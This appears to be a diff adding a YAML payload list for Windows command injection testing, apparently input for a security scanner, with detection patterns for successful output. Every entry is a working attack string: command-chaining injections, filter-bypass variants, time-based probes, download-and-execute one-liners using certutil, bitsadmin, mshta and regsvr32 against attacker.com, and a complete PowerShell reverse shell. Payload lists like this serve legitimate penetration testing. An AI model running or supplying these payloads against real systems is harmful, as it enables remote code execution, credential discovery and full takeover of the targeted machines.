@@ -1,0 +1,448 @@
+metadata:
+  type: cmdi/windows
+  version: "1.0"
+  description: "Windows command injection payloads"
+  sources: ["OWASP", "PayloadsAllTheThings", "HackTricks"]
+
+detection_patterns:
+  - "NT AUTHORITY\\\\SYSTEM"
+  - "Volume Serial Number"
+  - "Windows.*?\\d+\\.\\d+"
+
+payloads:
+  basic:
+    - value: "& whoami"
+      description: "AND whoami"
+      severity: critical
+      tags: [basic, and]
+
+    - value: "| whoami"
+      description: "Pipe whoami"
+      severity: critical
+      tags: [basic, pipe]
+
+    - value: "&& whoami"
+      description: "Conditional AND whoami"
+      severity: critical
+      tags: [basic, and]
+
+    - value: "|| whoami"
+      description: "Conditional OR whoami"
+      severity: critical
+      tags: [basic, or]
+
+    - value: "& dir"
+      description: "AND dir"
+      severity: high
+      tags: [basic, dir]
+
+    - value: "| dir"
+      description: "Pipe dir"
+      severity: high
+      tags: [basic, dir]
+
+    - value: "& type C:\\Windows\\System32\\drivers\\etc\\hosts"
+      description: "Type hosts file"
+      severity: high
+      tags: [basic, file_read]
+
+    - value: "| type C:\\Windows\\System32\\drivers\\etc\\hosts"
+      description: "Pipe type hosts"
+      severity: high
+      tags: [basic, file_read]
+
+    - value: "& net user"
+      description: "AND net user"
+      severity: high
+      tags: [basic, net_user]
+
+    - value: "| net user"
+      description: "Pipe net user"
+      severity: high
+      tags: [basic, net_user]
+
+    - value: "& ipconfig"
+      description: "AND ipconfig"
+      severity: high
+      tags: [basic, network]
+
+    - value: "| ipconfig"
+      description: "Pipe ipconfig"
+      severity: high
+      tags: [basic, network]
+
+    - value: "& systeminfo"
+      description: "AND systeminfo"
+      severity: high
+      tags: [basic, info]
+
+    - value: "| systeminfo"
+      description: "Pipe systeminfo"
+      severity: high
+      tags: [basic, info]
+
+    - value: "& tasklist"
+      description: "AND tasklist"
+      severity: high
+      tags: [basic, process]
+
+    - value: "| tasklist"
+      description: "Pipe tasklist"
+      severity: high
+      tags: [basic, process]
+
+    - value: "& netstat -an"
+      description: "AND netstat"
+      severity: high
+      tags: [basic, network]
+
+    - value: "| netstat -an"
+      description: "Pipe netstat"
+      severity: high
+      tags: [basic, network]
+
+    - value: "%0a whoami"
+      description: "Newline whoami"
+      severity: critical
+      tags: [basic, newline]
+
+    - value: "%0d%0a whoami"
+      description: "CRLF whoami"
+      severity: critical
+      tags: [basic, newline]
+
+    - value: "'; whoami;#"
+      description: "Quote breakout whoami"
+      severity: critical
+      tags: [basic, breakout]
+
+    - value: "\"; whoami;#"
+      description: "Double quote breakout"
+      severity: critical
+      tags: [basic, breakout]
+
+  powershell:
+    - value: "powershell -c \"whoami\""
+      description: "PowerShell whoami"
+      severity: critical
+      tags: [powershell]
+
+    - value: "powershell -c \"Get-Process\""
+      description: "PowerShell Get-Process"
+      severity: high
+      tags: [powershell]
+
+    - value: "powershell -c \"Get-Service\""
+      description: "PowerShell Get-Service"
+      severity: high
+      tags: [powershell]
+
+    - value: "powershell -c \"Get-ChildItem C:\\\""
+      description: "PowerShell list C:"
+      severity: high
+      tags: [powershell]
+
+    - value: "powershell -c \"Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts\""
+      description: "PowerShell read hosts"
+      severity: high
+      tags: [powershell, file_read]
+
+    - value: "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\""
+      description: "PowerShell IEX download"
+      severity: critical
+      tags: [powershell, download]
+
+    - value: "powershell -c \"Invoke-WebRequest http://attacker.com/file -OutFile C:\\temp\\file.exe\""
+      description: "PowerShell download file"
+      severity: critical
+      tags: [powershell, download]
+
+    - value: "powershell -c \"Start-Process calc.exe\""
+      description: "PowerShell start process"
+      severity: high
+      tags: [powershell]
+
+    - value: "powershell -c \"Get-WmiObject Win32_OperatingSystem\""
+      description: "PowerShell WMI OS info"
+      severity: high
+      tags: [powershell, wmi]
+
+    - value: "powershell -c \"Get-NetIPAddress\""
+      description: "PowerShell network config"
+      severity: high
+      tags: [powershell, network]
+
+    - value: "powershell -e <base64>"
+      description: "PowerShell encoded command"
+      severity: critical
+      tags: [powershell, encoded]
+
+    - value: "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/p')\""
+      description: "PowerShell no profile download"
+      severity: critical
+      tags: [powershell, download]
+
+    - value: "powershell -w hidden -c \"whoami\""
+      description: "PowerShell hidden window"
+      severity: critical
+      tags: [powershell, hidden]
+
+    - value: "powershell -c \"Get-ChildItem Env:\""
+      description: "PowerShell environment"
+      severity: high
+      tags: [powershell, env]
+
+    - value: "powershell -c \"[System.Net.Dns]::GetHostByName('attacker.com')\""
+      description: "PowerShell DNS lookup"
+      severity: high
+      tags: [powershell, dns]
+
+    - value: "powershell -c \"New-Object System.Net.Sockets.TCPClient('attacker.com',4444)\""
+      description: "PowerShell TCP connection"
+      severity: high
+      tags: [powershell, network]
+
+    - value: "& powershell -c \"whoami\""
+      description: "AND PowerShell whoami"
+      severity: critical
+      tags: [powershell]
+
+    - value: "| powershell -c \"whoami\""
+      description: "Pipe PowerShell whoami"
+      severity: critical
+      tags: [powershell]
+
+  certutil:
+    - value: "certutil -urlcache -split -f http://attacker.com/file.exe C:\\temp\\file.exe"
+      description: "certutil download"
+      severity: critical
+      tags: [certutil, download]
+
+    - value: "& certutil -urlcache -split -f http://attacker.com/file.exe C:\\temp\\file.exe"
+      description: "AND certutil download"
+      severity: critical
+      tags: [certutil, download]
+
+    - value: "| certutil -urlcache -split -f http://attacker.com/file.exe C:\\temp\\file.exe"
+      description: "Pipe certutil download"
+      severity: critical
+      tags: [certutil, download]
+
+    - value: "certutil -encode C:\\Windows\\win.ini C:\\temp\\encoded.txt"
+      description: "certutil encode file"
+      severity: high
+      tags: [certutil, encode]
+
+    - value: "certutil -decode C:\\temp\\encoded.txt C:\\temp\\decoded.txt"
+      description: "certutil decode file"
+      severity: high
+      tags: [certutil, decode]
+
+    - value: "certutil -hashfile C:\\Windows\\System32\\cmd.exe MD5"
+      description: "certutil hash file"
+      severity: medium
+      tags: [certutil, hash]
+
+  bitsadmin:
+    - value: "bitsadmin /transfer myJob /download /priority high http://attacker.com/file.exe C:\\temp\\file.exe"
+      description: "bitsadmin download"
+      severity: critical
+      tags: [bitsadmin, download]
+
+    - value: "& bitsadmin /transfer myJob /download /priority high http://attacker.com/file.exe C:\\temp\\file.exe"
+      description: "AND bitsadmin download"
+      severity: critical
+      tags: [bitsadmin, download]
+
+    - value: "| bitsadmin /transfer myJob /download /priority high http://attacker.com/file.exe C:\\temp\\file.exe"
+      description: "Pipe bitsadmin download"
+      severity: critical
+      tags: [bitsadmin, download]
+
+    - value: "bitsadmin /create myJob && bitsadmin /addfile myJob http://attacker.com/file.exe C:\\temp\\file.exe && bitsadmin /RESUME myJob"
+      description: "bitsadmin multi-step"
+      severity: critical
+      tags: [bitsadmin, download]
+
+  filter_bypass:
+    - value: "wh^oami"
+      description: "Caret bypass whoami"
+      severity: critical
+      tags: [filter_bypass, caret]
+
+    - value: "c^at C:\\Windows\\System32\\drivers\\etc\\hosts"
+      description: "Caret bypass cat"
+      severity: critical
+      tags: [filter_bypass, caret]
+
+    - value: "wh\"o\"ami"
+      description: "Quote bypass whoami"
+      severity: critical
+      tags: [filter_bypass, quote]
+
+    - value: "c\"a\"t C:\\Windows\\System32\\drivers\\etc\\hosts"
+      description: "Quote bypass cat"
+      severity: critical
+      tags: [filter_bypass, quote]
+
+    - value: "wh,;oami"
+      description: "Comma bypass whoami"
+      severity: critical
+      tags: [filter_bypass, comma]
+
+    - value: "c,;at C:\\Windows\\System32\\drivers\\etc\\hosts"
+      description: "Comma bypass cat"
+      severity: critical
+      tags: [filter_bypass, comma]
+
+    - value: "set x=who&&cmd /c %x%"
+      description: "Variable bypass"
+      severity: critical
+      tags: [filter_bypass, variable]
+
+    - value: "cmd /c whoami"
+      description: "cmd /c whoami"
+      severity: critical
+      tags: [filter_bypass, cmd]
+
+    - value: "cmd /c type C:\\Windows\\System32\\drivers\\etc\\hosts"
+      description: "cmd /c type"
+      severity: high
+      tags: [filter_bypass, cmd]
+
+    - value: "cmd /c dir C:\\"
+      description: "cmd /c dir"
+      severity: high
+      tags: [filter_bypass, cmd]
+
+    - value: "cmd /c echo %username%"
+      description: "cmd /c echo username"
+      severity: high
+      tags: [filter_bypass, cmd]
+
+    - value: "cmd /c echo %computername%"
+      description: "cmd /c echo computername"
+      severity: high
+      tags: [filter_bypass, cmd]
+
+    - value: "cmd /c set"
+      description: "cmd /c environment"
+      severity: high
+      tags: [filter_bypass, cmd]
+
+    - value: "for /f \"tokens=*\" %i in ('whoami') do echo %i"
+      description: "FOR loop bypass"
+      severity: critical
+      tags: [filter_bypass, for]
+
+    - value: "for /f \"tokens=*\" %i in ('type C:\\Windows\\System32\\drivers\\etc\\hosts') do echo %i"
+      description: "FOR loop file read"
+      severity: critical
+      tags: [filter_bypass, for]
+
+    - value: "wmic process list full"
+      description: "WMIC process list"
+      severity: high
+      tags: [filter_bypass, wmic]
+
+    - value: "wmic os get caption"
+      description: "WMIC OS caption"
+      severity: high
+      tags: [filter_bypass, wmic]
+
+    - value: "wmic nic get macaddress"
+      description: "WMIC MAC address"
+      severity: high
+      tags: [filter_bypass, wmic]
+
+  time_based:
+    - value: "& ping -n 5 127.0.0.1"
+      description: "Ping delay 5s"
+      severity: high
+      tags: [time_based, ping]
+
+    - value: "| ping -n 5 127.0.0.1"
+      description: "Pipe ping delay"
+      severity: high
+      tags: [time_based, ping]
+
+    - value: "&& ping -n 5 127.0.0.1"
+      description: "AND ping delay"
+      severity: high
+      tags: [time_based, ping]
+
+    - value: "& timeout /t 5"
+      description: "Timeout 5s"
+      severity: high
+      tags: [time_based, timeout]
+
+    - value: "| timeout /t 5"
+      description: "Pipe timeout"
+      severity: high
+      tags: [time_based, timeout]
+
+    - value: "& powershell -c \"Start-Sleep -Seconds 5\""
+      description: "PowerShell sleep"
+      severity: high
+      tags: [time_based, powershell]
+
+    - value: "| powershell -c \"Start-Sleep -Seconds 5\""
+      description: "Pipe PowerShell sleep"
+      severity: high
+      tags: [time_based, powershell]
+
+    - value: "%0a ping -n 5 127.0.0.1"
+      description: "Newline ping delay"
+      severity: high
+      tags: [time_based, ping]
+
+    - value: "ping -n 5 127.0.0.1"
+      description: "Direct ping delay"
+      severity: high
+      tags: [time_based, ping]
+
+    - value: "powershell -c \"Start-Sleep -Seconds 5\""
+      description: "Direct PowerShell sleep"
+      severity: high
+      tags: [time_based, powershell]
+
+  reverse_shell:
+    - value: "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
+      description: "PowerShell reverse shell"
+      severity: critical
+      tags: [reverse_shell, powershell]
+
+    - value: "powershell IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
+      description: "PowerShell download + execute"
+      severity: critical
+      tags: [reverse_shell, powershell, download]
+
+    - value: "certutil -urlcache -split -f http://attacker.com/shell.exe C:\\temp\\s.exe && C:\\temp\\s.exe"
+      description: "certutil download + execute"
+      severity: critical
+      tags: [reverse_shell, certutil, download]
+
+    - value: "bitsadmin /transfer myJob /download /priority high http://attacker.com/shell.exe C:\\temp\\s.exe && C:\\temp\\s.exe"
+      description: "bitsadmin download + execute"
+      severity: critical
+      tags: [reverse_shell, bitsadmin, download]
+
+    - value: "mshta http://attacker.com/shell.hta"
+      description: "mshta HTA execution"
+      severity: critical
+      tags: [reverse_shell, mshta]
+
+    - value: "rundll32.exe \\\\attacker.com\\share\\shell.dll,EntryPoint"
+      description: "rundll32 remote DLL"
+      severity: critical
+      tags: [reverse_shell, rundll32]
+
+    - value: "regsvr32 /s /n /u /i:http://attacker.com/file.sct scrobj.dll"
+      description: "regsvr32 SCT execution"
+      severity: critical
+      tags: [reverse_shell, regsvr32]
+
+    - value: "cscript //E:vbscript //B http://attacker.com/shell.vbs"
+      description: "cscript VBS execution"
+      severity: critical
+      tags: [reverse_shell, cscript]
